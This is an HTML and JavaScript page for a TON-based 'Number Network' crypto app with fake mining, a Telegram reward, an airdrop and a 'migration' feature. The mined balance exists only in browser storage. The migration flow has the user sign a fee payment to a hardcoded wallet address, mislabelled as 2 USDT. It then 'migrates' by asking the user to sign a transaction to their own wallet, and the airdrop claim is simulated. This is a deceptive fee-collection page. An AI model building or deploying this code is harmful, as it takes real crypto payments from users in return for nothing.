<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Number Network - Secure Crypto Ecosystem</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #0a0a0a, #111111);
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }

        .container {
            position: relative;
            width: 100%;
            max-width: 900px;
            text-align: center;
            padding: 20px;
            margin-right: 100px;
        }

        #nn-counter {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            width: 100%;
            font-size: 24px;
            color: #00ff88;
            padding: 15px 0;
            background-color: #3a3a3a;
            text-align: center;
            font-weight: bold;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
            z-index: 1000;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        #hamburger-menu {
            position: fixed;
            left: 20px;
            top: 15px;
            font-size: 24px;
            cursor: pointer;
            z-index: 1001;
            color: #00ff88;
        }

        #dropdown-menu {
            position: fixed;
            left: 20px;
            top: 60px;
            background-color: #3a3a3a;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
            display: none;
            z-index: 1001;
        }

        #dropdown-menu ul {
            list-style: none;
            padding: 10px;
            margin: 0;
        }

        #dropdown-menu ul li {
            padding: 10px 20px;
            color: #ffffff;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        #dropdown-menu ul li:hover {
            background-color: #00ff88;
            color: #0a0a0a;
        }

        .card h1 {
            font-size: 28px;
            color: #00ff88;
            margin-bottom: 15px;
        }

        .ceo-image {
            position: fixed;
            top: 45px;
            left: 0;
            right: 0;
            height: 350px;
            background-size: cover;
            background-position: center;
            z-index: -1;
        }

        .ceo-announcement {
            margin-top: 320px;
            padding: 20px;
            background-color: rgba(0, 0, 0, 0.7);
            border-radius: 12px;
            text-align: left;
        }

        .ceo-announcement h2 {
            font-size: 22px;
            color: #00ff88;
            margin-bottom: 10px;
        }

        .ceo-announcement p {
            font-size: 14px;
            line-height: 1.6;
            color: #cccccc;
        }

        .card-buttons {
            display: flex;
            justify-content: flex-start;
            gap: 10px;
        }

        .card-buttons a {
            text-decoration: none;
            color: #fff;
            background-color: #00ff88;
            padding: 10px 20px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: bold;
            display: flex;
            align-items: center;
            gap: 8px;
            transition: background-color 0.3s;
        }

        .card-buttons a:hover {
            background-color: #00cc66;
        }

        .social-buttons {
            position: fixed;
            top: 400px;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            flex-direction: row;
            gap: 20px;
            z-index: 1000;
        }

        .social-button {
            text-decoration: none;
            color: #fff;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: bold;
            display: flex;
            align-items: center;
            gap: 8px;
            transition: background-color 0.3s, transform 0.3s;
        }

        .social-button:hover {
            transform: scale(1.05);
        }

        .twitter-button {
            background-color: #1DA1F2;
        }

        .twitter-button:hover {
            background-color: #1991DB;
        }

        .telegram-button {
            background-color: #0088CC;
        }

        .telegram-button:hover {
            background-color: #0077B5;
        }

        .features-area {
            position: fixed;
            top: 15%;
            right: 5%;
            display: flex;
            flex-direction: column;
            gap: 20px;
            align-items: flex-end;
        }

        .feature {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            color: #fff;
            font-size: 12px;
            transition: transform 0.3s ease;
            cursor: pointer;
        }

        .feature i {
            font-size: 24px;
            color: #00ff88;
            margin-bottom: 5px;
        }

        .feature.mining-icon i {
            font-size: 30px;
            color: #ff5733;
            animation: pulse 1s infinite;
        }

        #migration-icon i, #airdrop-icon i {
            font-size: 24px;
            color: #00bcd4;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }

        .loader {
            width: 20px;
            height: 20px;
            border: 3px solid #00ff88;
            border-top: 3px solid #ffffff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            display: inline-block;
            vertical-align: middle;
            margin-left: 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .modal {
            display: none;
            position: fixed;
            z-index: 1002;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0, 0, 0, 0.9);
        }

        .modal-content-enhanced {
            background: linear-gradient(145deg, #1f2a44, #2e3b5e);
            margin: 5% auto;
            padding: 20px;
            width: 90%;
            max-width: 420px;
            border-radius: 15px;
            color: #ffffff;
            box-shadow: 0 8px 25px rgba(0, 255, 204, 0.25);
            border: 2px solid #00ffcc;
            position: relative;
            overflow: hidden;
            animation: slideUp 0.5s ease-out;
        }

        @keyframes slideUp {
            0% { transform: translateY(100px); opacity: 0; }
            100% { transform: translateY(0); opacity: 1; }
        }

        .modal-content-enhanced::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(0, 255, 204, 0.15) 0%, transparent 60%);
            animation: glowPulse 5s infinite;
        }

        @keyframes glowPulse {
            0% { transform: scale(1); opacity: 0.5; }
            50% { transform: scale(1.2); opacity: 0.8; }
            100% { transform: scale(1); opacity: 0.5; }
        }

        .close-enhanced {
            color: #00ffcc;
            position: absolute;
            top: 10px;
            right: 15px;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
            transition: color 0.3s, transform 0.3s;
        }

        .close-enhanced:hover {
            color: #ff66cc;
            transform: scale(1.2) rotate(90deg);
        }

        .modal-header-enhanced {
            text-align: center;
            margin-bottom: 20px;
            position: relative;
            z-index: 1;
        }

        .modal-header-enhanced h2 {
            color: #00ffcc;
            font-size: 24px;
            margin: 0;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            text-shadow: 0 0 8px rgba(0, 255, 204, 0.6);
        }

        .modal-info-enhanced {
            padding: 15px;
            border-radius: 10px;
            background: rgba(0, 255, 204, 0.12);
            margin-bottom: 20px;
            border: 1px solid rgba(0, 255, 204, 0.3);
            position: relative;
            z-index: 1;
        }

        .modal-info-enhanced p {
            margin: 8px 0;
            font-size: 14px;
            line-height: 1.5;
        }

        .highlight-enhanced {
            color: #ff66cc;
            font-weight: bold;
        }

        .address-enhanced {
            font-size: 12px;
            opacity: 0.85;
            word-break: break-all;
        }

        .modal-buttons-enhanced {
            display: flex;
            flex-direction: column;
            gap: 10px;
            position: relative;
            z-index: 1;
        }

        .button-enhanced {
            padding: 12px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            text-align: center;
            position: relative;
            overflow: hidden;
            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.2);
        }

        .button-enhanced::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            transform: translate(-50%, -50%);
            transition: width 0.4s, height 0.4s;
        }

        .button-enhanced:hover::after {
            width: 150%;
            height: 150%;
        }

        .connect-wallet-enhanced {
            background: linear-gradient(45deg, #00ccff, #66ffff);
            color: #1a1a1a;
        }

        .connect-wallet-enhanced:hover {
            background: linear-gradient(45deg, #0099cc, #33cccc);
        }

        .pay-fee-enhanced {
            background: linear-gradient(45deg, #ff66cc, #ff99cc);
            color: #ffffff;
        }

        .pay-fee-enhanced:hover {
            background: linear-gradient(45deg, #ff3399, #ff66b3);
        }

        .migrate-coins-enhanced {
            background: linear-gradient(45deg, #00ffcc, #66ffcc);
            color: #1a1a1a;
        }

        .migrate-coins-enhanced:hover {
            background: linear-gradient(45deg, #00cc99, #33cc99);
        }

        .claim-airdrop-enhanced {
            background: linear-gradient(45deg, #ff9933, #ffcc66);
            color: #1a1a1a;
        }

        .claim-airdrop-enhanced:hover {
            background: linear-gradient(45deg, #ff6600, #ff9933);
        }

        .modal-status-enhanced {
            text-align: center;
            margin-top: 15px;
            font-size: 12px;
            color: #00ffcc;
            min-height: 20px;
            position: relative;
            z-index: 1;
        }

        .error-message {
            color: #ff3333;
        }

        .disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .flower-enhanced {
            position: fixed;
            width: 40px;
            height: 40px;
            z-index: 1003;
            animation: bloomAndFall 3.5s ease-out forwards;
        }

        .flower-enhanced svg {
            width: 100%;
            height: 100%;
            filter: drop-shadow(0 0 5px rgba(255, 102, 204, 0.7));
        }

        @keyframes bloomAndFall {
            0% { transform: translateY(-100vh) scale(0.5) rotate(0deg); opacity: 0; }
            20% { transform: translateY(-50vh) scale(1.2) rotate(90deg); opacity: 1; }
            100% { transform: translateY(100vh) scale(0.8) rotate(360deg); opacity: 0; }
        }

        @media (max-width: 768px) {
            .features-area {
                right: 2%;
                top: 10%;
            }

            .container {
                margin-right: 50px;
            }

            .card-buttons {
                flex-direction: column;
                gap: 10px;
            }

            #nn-counter {
                font-size: 20px;
                padding: 12px 0;
            }

            .social-buttons {
                top: 380px;
                flex-direction: row;
                gap: 10px;
            }

            .modal-content-enhanced {
                width: 95%;
                padding: 15px;
                margin: 10% auto;
            }

            .modal-header-enhanced h2 {
                font-size: 20px;
            }

            .modal-info-enhanced {
                padding: 12px;
            }

            .button-enhanced {
                padding: 10px;
                font-size: 13px;
            }
        }

        @media (max-width: 480px) {
            .modal-content-enhanced {
                width: 98%;
                padding: 10px;
            }

            .modal-header-enhanced h2 {
                font-size: 18px;
            }

            .modal-info-enhanced p {
                font-size: 12px;
            }
        }
    </style>
</head>
<body>
    <div id="hamburger-menu">☰</div>
    <div id="dropdown-menu">
        <ul>
            <li id="airdrop-menu-item">Airdrop</li>
            <li>Mine</li>
            <li>Wallet</li>
            <li>Settings</li>
        </ul>
    </div>

    <div id="nn-counter">0.0000 nn</div>
    <div class="ceo-image" id="ceo-announcement-image"></div>

    <div class="social-buttons">
        <a href="https://x.com/number_network?t=Y1q9j3rLkzgQnBN9OVZr3A&s=09" class="social-button twitter-button" target="_blank">
            <i class="fab fa-twitter"></i> X/Twitter
        </a>
        <a href="https://t.me/number_network" class="social-button telegram-button" target="_blank">
            <i class="fab fa-telegram-plane"></i> Telegram
        </a>
    </div>

    <div class="container">
        <div class="card">
            <h1></h1>
            <div class="ceo-announcement">
                <div class="ceo-text">
                    <h2>CEO Announcement</h2>
                    <p id="ceo-announcement-text"></p>
                </div>
            </div>
            <div class="card-buttons">
                <a href="#" id="whitepaper-btn">
                    <i class="fas fa-file-alt"></i> White Paper
                </a>
            </div>
        </div>
    </div>

    <div class="features-area">
        <div class="feature">
            <i class="fas fa-user-friends"></i>
            <span>Friends</span>
        </div>
        <div class="feature" id="airdrop-icon">
            <i class="fas fa-gift"></i>
            <span>Airdrop</span>
        </div>
        <div class="feature" id="wallet-icon">
            <i class="fas fa-wallet"></i>
            <span>Wallet</span>
        </div>
        <div class="feature mining-icon" id="mine-icon">
            <i class="fas fa-hammer"></i>
            <span id="mine-text">Mine</span>
            <span id="mining-rate" style="color: #00ff88; display: none;">2 nn/h</span>
        </div>
        <div class="feature" id="telegram-icon">
            <i class="fab fa-telegram-plane"></i>
            <span>Telegram</span>
        </div>
        <div class="feature" id="migration-icon">
            <i class="fas fa-share-alt"></i>
            <span>Migration</span>
        </div>
    </div>

    <div id="infoModal" class="modal">
        <div class="modal-content-enhanced">
            <span class="close-enhanced">×</span>
            <div class="modal-header-enhanced">
                <h2>White Paper Info</h2>
            </div>
            <div class="modal-info-enhanced">
                <p>We are working on the white paper. It's your time to explore, and it's our work to make you enjoy the project. Thank you!</p>
            </div>
        </div>
    </div>

    <div id="migrationModal" class="modal">
        <div class="modal-content-enhanced">
            <span class="close-enhanced">×</span>
            <div class="modal-header-enhanced">
                <h2>Migrate NN</h2>
            </div>
            <div class="modal-info-enhanced">
                <p>Balance: <span class="highlight-enhanced" id="current-balance">0.0000 nn</span></p>
                <p>Fee: <span class="highlight-enhanced">2 USDT</span></p>
                <p class="address-enhanced">To: <span class="highlight-enhanced">UQABi--VPQ0JPUjVMXXYWEAxWsFpRfJGL-EKi7zH3UFdFsyz</span></p>
            </div>
            <div class="modal-buttons-enhanced">
                <button class="button-enhanced connect-wallet-enhanced" id="connectWalletBtn">Connect Wallet</button>
                <button class="button-enhanced pay-fee-enhanced disabled" id="payFeeBtn" disabled>Pay Fee</button>
                <button class="button-enhanced migrate-coins-enhanced disabled" id="migrateCoinsBtn" disabled>Migrate Coins</button>
            </div>
            <div class="modal-status-enhanced" id="migrationStatus"></div>
        </div>
    </div>

    <div id="airdropModal" class="modal">
        <div class="modal-content-enhanced">
            <span class="close-enhanced">×</span>
            <div class="modal-header-enhanced">
                <h2>NN Airdrop</h2>
            </div>
            <div class="modal-info-enhanced">
                <p>Available: <span class="highlight-enhanced" id="airdrop-amount">0.0000 NN</span></p>
                <p>Requirement: <span class="highlight-enhanced">Connected TON Wallet</span></p>
                <p>Status: <span class="highlight-enhanced" id="airdrop-status">Not Claimed</span></p>
            </div>
            <div class="modal-buttons-enhanced">
                <button class="button-enhanced claim-airdrop-enhanced disabled" id="claimAirdropBtn" disabled>Claim Airdrop</button>
            </div>
            <div class="modal-status-enhanced" id="airdropStatus"></div>
        </div>
    </div>

    <script>
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://yourwebsite.com/tonconnect-manifest.json',
        });

        const walletIcon = document.getElementById('wallet-icon');
        const migrationModal = document.getElementById('migrationModal');
        const connectWalletBtn = document.getElementById('connectWalletBtn');
        const payFeeBtn = document.getElementById('payFeeBtn');
        const migrateCoinsBtn = document.getElementById('migrateCoinsBtn');
        const migrationStatus = document.getElementById('migrationStatus');
        let isFeePaid = false;

        walletIcon.addEventListener('click', () => {
            tonConnectUI.connectWallet();
        });

        tonConnectUI.onStatusChange((wallet) => {
            if (wallet) {
                console.log('Connected Wallet:', wallet);
                if (migrationModal.style.display === 'block') {
                    connectWalletBtn.style.display = 'none';
                    payFeeBtn.classList.remove('disabled');
                    payFeeBtn.disabled = false;
                    migrationStatus.textContent = 'Wallet connected!';
                    setTimeout(() => migrationStatus.textContent = '', 2000);
                }
                if (airdropModal.style.display === 'block' && nnCounter > 0) {
                    document.getElementById('airdrop-status').textContent = 'Wallet Connected';
                    claimAirdropBtn.classList.remove('disabled');
                    claimAirdropBtn.disabled = false;
                }
            } else {
                console.log('Wallet disconnected');
                if (migrationModal.style.display === 'block') {
                    connectWalletBtn.style.display = 'block';
                    payFeeBtn.classList.add('disabled');
                    payFeeBtn.disabled = true;
                    migrateCoinsBtn.classList.add('disabled');
                    migrateCoinsBtn.disabled = true;
                    isFeePaid = false;
                    migrationStatus.textContent = 'Wallet disconnected';
                    setTimeout(() => migrationStatus.textContent = '', 2000);
                }
                if (airdropModal.style.display === 'block') {
                    document.getElementById('airdrop-status').textContent = 'Not Claimed';
                    claimAirdropBtn.classList.add('disabled');
                    claimAirdropBtn.disabled = true;
                }
            }
        });

        const hamburgerMenu = document.getElementById('hamburger-menu');
        const dropdownMenu = document.getElementById('dropdown-menu');
        hamburgerMenu.addEventListener('click', () => {
            dropdownMenu.style.display = dropdownMenu.style.display === 'block' ? 'none' : 'block';
        });

        window.addEventListener('click', (event) => {
            if (event.target !== hamburgerMenu && event.target !== dropdownMenu) {
                dropdownMenu.style.display = 'none';
            }
        });

        const rate = 2 / 3600; // 2 NN per hour
        const counterDisplay = document.getElementById('nn-counter');
        const mineIcon = document.getElementById('mine-icon');
        const mineText = document.getElementById('mine-text');
        const miningRate = document.getElementById('mining-rate');
        const telegramIcon = document.getElementById('telegram-icon');
        let nnCounter = parseFloat(localStorage.getItem('nnCounter')) || 0; // Mined coins
        let claimedBalance = parseFloat(localStorage.getItem('claimedBalance')) || 0; // Claimed coins
        let startTime = parseFloat(localStorage.getItem('startTime')) || null;
        let miningInterval;
        let telegramRewardClaimed = localStorage.getItem('telegramRewardClaimed') === 'true';

        function updateCounter() {
            if (startTime) {
                const elapsedTime = (Date.now() - startTime) / 1000;
                nnCounter += elapsedTime * rate;
                localStorage.setItem('nnCounter', nnCounter.toFixed(4));
                startTime = Date.now();
                localStorage.setItem('startTime', startTime);
            }
            counterDisplay.textContent = nnCounter.toFixed(4) + ' nn';
            document.getElementById('current-balance').textContent = nnCounter.toFixed(4) + ' nn';
            if (airdropModal.style.display === 'block') {
                document.getElementById('airdrop-amount').textContent = nnCounter.toFixed(4) + ' NN';
                if (tonConnectUI.wallet && nnCounter > 0) {
                    claimAirdropBtn.classList.remove('disabled');
                    claimAirdropBtn.disabled = false;
                }
            }
        }

        function startMining() {
            if (miningInterval) {
                if (migrationModal.style.display === 'block') {
                    migrationStatus.textContent = 'Already mining';
                    setTimeout(() => migrationStatus.textContent = '', 2000);
                }
                return;
            }
            startTime = Date.now();
            localStorage.setItem('startTime', startTime);
            miningInterval = setInterval(updateCounter, 1000);
            counterDisplay.style.color = '#00ff88';
            mineText.style.display = 'none';
            miningRate.style.display = 'inline';
            if (migrationModal.style.display === 'block') {
                migrationStatus.textContent = 'Mining started!';
                setTimeout(() => migrationStatus.textContent = '', 2000);
            }
        }

        function stopMining() {
            clearInterval(miningInterval);
            miningInterval = null;
            startTime = null;
            localStorage.removeItem('startTime');
            mineText.style.display = 'inline';
            miningRate.style.display = 'none';
        }

        telegramIcon.addEventListener('click', () => {
            if (!telegramRewardClaimed) {
                window.open('https://t.me/numbernetwork_community', '_blank');
                nnCounter += 50;
                localStorage.setItem('nnCounter', nnCounter.toFixed(4));
                localStorage.setItem('telegramRewardClaimed', 'true');
                telegramRewardClaimed = true;
                updateCounter();
                if (migrationModal.style.display === 'block') {
                    migrationStatus.textContent = 'Telegram reward: 50 nn added!';
                    setTimeout(() => migrationStatus.textContent = '', 2000);
                }
            } else if (migrationModal.style.display === 'block') {
                migrationStatus.textContent = 'Telegram reward already claimed';
                setTimeout(() => migrationStatus.textContent = '', 2000);
            }
        });

        mineIcon.addEventListener('click', startMining);

        const infoModal = document.getElementById('infoModal');
        const whitepaperBtn = document.getElementById('whitepaper-btn');
        const infoClose = infoModal.getElementsByClassName('close-enhanced')[0];
        whitepaperBtn.onclick = () => { infoModal.style.display = 'block'; }
        infoClose.onclick = () => { infoModal.style.display = 'none'; }

        const migrationIcon = document.getElementById('migration-icon');
        const migrationClose = migrationModal.getElementsByClassName('close-enhanced')[0];

        migrationIcon.addEventListener('click', () => {
            updateCounter();
            migrationModal.style.display = 'block';
            if (tonConnectUI.wallet) {
                connectWalletBtn.style.display = 'none';
                payFeeBtn.classList.remove('disabled');
                payFeeBtn.disabled = false;
                if (isFeePaid) {
                    migrateCoinsBtn.classList.remove('disabled');
                    migrateCoinsBtn.disabled = false;
                }
            }
        });

        connectWalletBtn.addEventListener('click', () => {
            tonConnectUI.connectWallet();
        });

        payFeeBtn.addEventListener('click', async () => {
            try {
                migrationStatus.textContent = 'Processing payment...';
                payFeeBtn.disabled = true;
                payFeeBtn.innerHTML = 'Paying <span class="loader"></span>';
                
                const recipientAddress = 'UQABi--VPQ0JPUjVMXXYWEAxWsFpRfJGL-EKi7zH3UFdFsyz';
                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 60,
                    messages: [{
                        address: recipientAddress,
                        amount: '2000000', // 2 USDT in nano units
                    }]
                };

                const result = await tonConnectUI.sendTransaction(transaction);
                
                if (result) {
                    isFeePaid = true;
                    migrationStatus.textContent = 'Fee paid! Migrating...';
                    payFeeBtn.style.display = 'none';
                    migrateCoinsBtn.classList.remove('disabled');
                    migrateCoinsBtn.disabled = false;
                    
                    setTimeout(async () => {
                        try {
                            if (nnCounter <= 0) {
                                migrationStatus.textContent = 'No coins to migrate!';
                                migrationStatus.classList.add('error-message');
                                setTimeout(() => {
                                    migrationStatus.textContent = '';
                                    migrationStatus.classList.remove('error-message');
                                }, 2000);
                                return;
                            }

                            const migrationTransaction = {
                                validUntil: Math.floor(Date.now() / 1000) + 60,
                                messages: [{
                                    address: tonConnectUI.wallet.account.address,
                                    amount: Math.floor(nnCounter * 1000000000).toString(),
                                }]
                            };

                            const migrationResult = await tonConnectUI.sendTransaction(migrationTransaction);
                            
                            if (migrationResult) {
                                nnCounter = 0;
                                localStorage.setItem('nnCounter', '0');
                                updateCounter();
                                migrationStatus.textContent = 'Migration completed!';
                                setTimeout(() => {
                                    migrationModal.style.display = 'none';
                                    migrationStatus.textContent = '';
                                    isFeePaid = false;
                                    payFeeBtn.style.display = 'block';
                                    payFeeBtn.classList.add('disabled');
                                    payFeeBtn.disabled = true;
                                    payFeeBtn.innerHTML = 'Pay Fee';
                                    migrateCoinsBtn.classList.add('disabled');
                                    migrateCoinsBtn.disabled = true;
                                    migrateCoinsBtn.innerHTML = 'Migrate Coins';
                                }, 2000);
                            }
                        } catch (error) {
                            console.error('Migration error:', error);
                            migrationStatus.textContent = 'Migration failed!';
                            migrationStatus.classList.add('error-message');
                            migrateCoinsBtn.disabled = false;
                            migrateCoinsBtn.innerHTML = 'Migrate Coins';
                            setTimeout(() => {
                                migrationStatus.textContent = '';
                                migrationStatus.classList.remove('error-message');
                            }, 2000);
                        }
                    }, 1000);
                }
            } catch (error) {
                console.error('Payment error:', error);
                migrationStatus.textContent = 'Payment failed!';
                migrationStatus.classList.add('error-message');
                payFeeBtn.disabled = false;
                payFeeBtn.innerHTML = 'Pay Fee';
                setTimeout(() => {
                    migrationStatus.textContent = '';
                    migrationStatus.classList.remove('error-message');
                }, 2000);
            }
        });

        migrateCoinsBtn.addEventListener('click', () => {
            migrationStatus.textContent = 'Migration already in progress!';
            setTimeout(() => migrationStatus.textContent = '', 2000);
        });

        migrationClose.addEventListener('click', () => {
            migrationModal.style.display = 'none';
            migrationStatus.textContent = '';
        });

        const airdropIcon = document.getElementById('airdrop-icon');
        const airdropMenuItem = document.getElementById('airdrop-menu-item');
        const airdropModal = document.getElementById('airdropModal');
        const claimAirdropBtn = document.getElementById('claimAirdropBtn');
        const airdropClose = airdropModal.getElementsByClassName('close-enhanced')[0];
        const airdropStatus = document.getElementById('airdropStatus');

        function openAirdropModal() {
            updateCounter();
            airdropModal.style.display = 'block';
            document.getElementById('airdrop-amount').textContent = nnCounter.toFixed(4) + ' NN';
            if (nnCounter <= 0) {
                document.getElementById('airdrop-status').textContent = 'Nothing to Claim';
                claimAirdropBtn.classList.add('disabled');
                claimAirdropBtn.disabled = true;
                claimAirdropBtn.textContent = 'Nothing to Claim';
            } else if (tonConnectUI.wallet) {
                document.getElementById('airdrop-status').textContent = 'Wallet Connected';
                claimAirdropBtn.classList.remove('disabled');
                claimAirdropBtn.disabled = false;
                claimAirdropBtn.textContent = 'Claim Airdrop';
            } else {
                document.getElementById('airdrop-status').textContent = 'Connect Wallet to Claim';
            }
        }

        airdropIcon.addEventListener('click', openAirdropModal);
        airdropMenuItem.addEventListener('click', openAirdropModal);

        function createEnhancedFlowers() {
            const flowerCount = 40;
            for (let i = 0; i < flowerCount; i++) {
                const flower = document.createElement('div');
                flower.className = 'flower-enhanced';
                flower.innerHTML = `
                    <svg viewBox="0 0 24 24">
                        <path fill="#ff66cc" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm0-14c-2.21 0-4 1.79-4 4 0 1.1.45 2.1 1.17 2.83L12 14l2.83-1.17c.72-.73 1.17-1.73 1.17-2.83 0-2.21-1.79-4-4-4zm0 6c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/>
                        <path fill="#ff99cc" d="M12 8c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/>
                    </svg>
                `;
                flower.style.left = `${Math.random() * 100}vw`;
                flower.style.animationDelay = `${Math.random() * 1.5}s`;
                document.body.appendChild(flower);
                setTimeout(() => flower.remove(), 3500);
            }
        }

        claimAirdropBtn.addEventListener('click', async () => {
            if (nnCounter <= 0) {
                airdropStatus.textContent = 'Nothing to claim!';
                setTimeout(() => airdropStatus.textContent = '', 2000);
                return;
            }

            try {
                airdropStatus.textContent = 'Claiming airdrop...';
                claimAirdropBtn.disabled = true;
                claimAirdropBtn.innerHTML = 'Claiming <span class="loader"></span>';

                await new Promise(resolve => setTimeout(resolve, 1500)); // Simulated delay

                claimedBalance += nnCounter;
                localStorage.setItem('claimedBalance', claimedBalance.toFixed(4));
                nnCounter = 0;
                localStorage.setItem('nnCounter', nnCounter.toFixed(4));
                stopMining();
                updateCounter();

                document.getElementById('airdrop-status').textContent = 'Claimed';
                airdropStatus.textContent = `Airdrop claimed! ${claimedBalance.toFixed(4)} NN total claimed`;
                claimAirdropBtn.textContent = 'Nothing to Claim';
                claimAirdropBtn.classList.add('disabled');

                createEnhancedFlowers();

                setTimeout(() => {
                    airdropModal.style.display = 'none';
                    airdropStatus.textContent = '';
                }, 2000);
            } catch (error) {
                console.error('Airdrop error:', error);
                airdropStatus.textContent = 'Claim failed!';
                airdropStatus.classList.add('error-message');
                claimAirdropBtn.disabled = false;
                claimAirdropBtn.innerHTML = 'Claim Airdrop';
                setTimeout(() => {
                    airdropStatus.textContent = '';
                    airdropStatus.classList.remove('error-message');
                }, 2000);
            }
        });

        airdropClose.addEventListener('click', () => {
            airdropModal.style.display = 'none';
            airdropStatus.textContent = '';
        });

        window.addEventListener('click', (event) => {
            if (event.target == infoModal) infoModal.style.display = 'none';
            if (event.target == migrationModal) {
                migrationModal.style.display = 'none';
                migrationStatus.textContent = '';
            }
            if (event.target == airdropModal) {
                airdropModal.style.display = 'none';
                airdropStatus.textContent = '';
            }
        });

        updateCounter();

        const ceoAnnouncementText = document.getElementById('ceo-announcement-text');
        const ceoAnnouncementImage = document.getElementById('ceo-announcement-image');
        const savedAnnouncement = localStorage.getItem('ceoAnnouncement');
        const savedImage = localStorage.getItem('ceoAnnouncementImage');

        if (savedAnnouncement) ceoAnnouncementText.textContent = savedAnnouncement;
        else ceoAnnouncementText.textContent = "No announcement available.";
        if (savedImage) ceoAnnouncementImage.style.backgroundImage = `url(${savedImage})`;
    </script>
</body>
</html>